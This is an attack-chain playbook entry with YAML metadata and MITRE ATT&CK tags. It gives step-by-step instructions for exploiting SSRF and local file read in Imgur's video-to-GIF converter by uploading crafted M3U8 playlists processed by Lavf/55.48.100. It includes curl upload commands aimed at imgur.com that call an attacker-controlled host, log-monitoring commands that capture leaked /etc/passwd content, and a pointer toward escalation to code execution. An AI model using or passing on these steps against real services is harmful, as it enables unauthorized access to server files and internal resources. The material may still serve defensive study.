---
tags:
  - ssrf
  - local-file-read
  - m3u8
  - lavf
  - imgur
type: attack_chain
tools:
  - '[[tools/Lavf-55.48.100]]'
  - '[[tools/FFmpeg]]'
tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Trigger-SSRF-with-M3U8-Upload]]'
  - '[[procedures/Observe-SSRF-Requests]]'
  - '[[procedures/Exploit-Local-File-Read-with-Concat-Protocol]]'
  - '[[procedures/Observe-Local-File-Read]]'
step_count: 4
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
updated_at: '2025-12-14T04:08:48.244Z'
description: >-
  Exploit SSRF and local file read vulnerabilities in Imgur's video to GIF
  converter by uploading specially crafted M3U8 playlists that leverage
  Lavf/55.48.100 to make arbitrary HTTP requests and access local files.
skill_level: intermediate
impact_level: high
id: b38b03de-2750-4e84-85e2-d262c9640adf
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[File and Directory Discovery]]'
---
# SSRF and Local File Read in Imgur Video to GIF Converter via Crafted M3U8 Playlists

Multi-stage attack chain demonstrating SSRF and local file read in Imgur's video to GIF converter by exploiting the Lavf/55.48.100 library's processing of M3U8 playlists with enabled network protocols.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Upload Crafted M3U8 for SSRF] --> B[Trigger Arbitrary HTTP Requests]
    B --> C[Upload Crafted M3U8 for File Read]
    C --> D[Access Local Files via Logs]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Lavf-55.48.100]]
- [[tools/FFmpeg]]

### Target Environment

- Web platform with Imgur's video to GIF converter service
- Access to /vidgif/upload endpoint
- Ability to monitor server logs (e.g., via controlled domain like yngwie.ru)

### Initial Access Requirements

- Public access to Imgur's upload endpoint
- No authentication required
- Network access to upload HTTP POST requests

## Detailed Attack Procedures

### Step 1: Trigger SSRF with M3U8 Upload
procedure: [[procedures/Trigger-SSRF-with-M3U8-Upload]]

**Objective**: Upload a crafted M3U8 playlist to force the server to make arbitrary external HTTP requests during video processing.

**Instructions**: Create an M3U8 file with playlist directives pointing to external URLs, then upload it via POST to /vidgif/upload. Use [[commands/upload-m3u8-for-ssrf]] to perform the upload:

```bash
curl -X POST https://imgur.com/vidgif/upload -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12" -F "file=@crafted.m3u8"
```

**Expected Output**: Server accepts the upload and begins processing, initiating GET requests to URLs in the playlist.

**Success Indicators**:
- Upload response from Imgur (e.g., 200 OK)
- No immediate errors in upload

### Step 2: Observe SSRF Requests
procedure: [[procedures/Observe-SSRF-Requests]]

**Objective**: Monitor server-initiated requests to confirm SSRF, such as GETs to external MP4 files.

**Instructions**: Check logs on your controlled server (e.g., yngwie.ru) for incoming requests from Lavf/55.48.100. These are triggered automatically after upload. Use [[commands/server-get-external-mp4-1]] and [[commands/server-get-external-mp4-2]] as indicators:

```bash
# Log entry example for first request
tail -f /var/log/nginx/access.log | grep "GET /1.mp4"
```

```bash
# Log entry example for second request
tail -f /var/log/nginx/access.log | grep "GET /2.mp4"
```

**Expected Output**: Log entries showing GET /1.mp4 (200 OK, 84 bytes) and GET /2.mp4 (404 Not Found, 169 bytes) with User-Agent: Lavf/55.48.100.

**Success Indicators**:
- Requests from Imgur's IP with Lavf User-Agent
- Access to internal or external resources confirmed

### Step 3: Exploit Local File Read with Concat Protocol
procedure: [[procedures/Exploit-Local-File-Read-with-Concat-Protocol]]

**Objective**: Upload a modified M3U8 using concat protocol to read local files like /etc/passwd.

**Instructions**: Prepare a header.m3u8 file and craft the main M3U8 with concat to file://. Upload via [[commands/upload-m3u8-for-file-read]]:

```bash
curl -X POST https://imgur.com/vidgif/upload -d "source=http://yngwie.ru/1.mp4&url=http://yngwie.ru/1.mp4&start=0.08&stop=5.12" -F "file=@concat-crafted.m3u8"
```

**Expected Output**: Server processes the playlist, attempting to concat remote and local files.

**Success Indicators**:
- Successful upload without rejection
- Processing initiated

### Step 4: Observe Local File Read
procedure: [[procedures/Observe-Local-File-Read]]

**Objective**: Capture evidence of local file content in malformed server requests.

**Instructions**: Monitor logs for requests triggered by concat, such as [[commands/server-get-local-file-content]]:

```bash
# Log entry showing file content
tail -f /var/log/nginx/access.log | grep "GET ?root:x:0:0:root:/root:/bin/bash"
```

**Expected Output**: Malformed GET request with query string containing /etc/passwd content (e.g., ?root:x:0:0:root:/root:/bin/bash), 400 Bad Request (173 bytes).

**Success Indicators**:
- File content leaked in query string
- Confirmation of local file access

## Attack Chain Summary

### Key Achievements

1. Successful SSRF to arbitrary external/internal HTTP endpoints
2. Local file read exposing sensitive data like /etc/passwd
3. Potential for escalation to RCE via other protocols (e.g., subfile)

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[File and Directory Discovery]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Discovery]]

---
*Last updated: 2023-10-01T00:00:00Z*
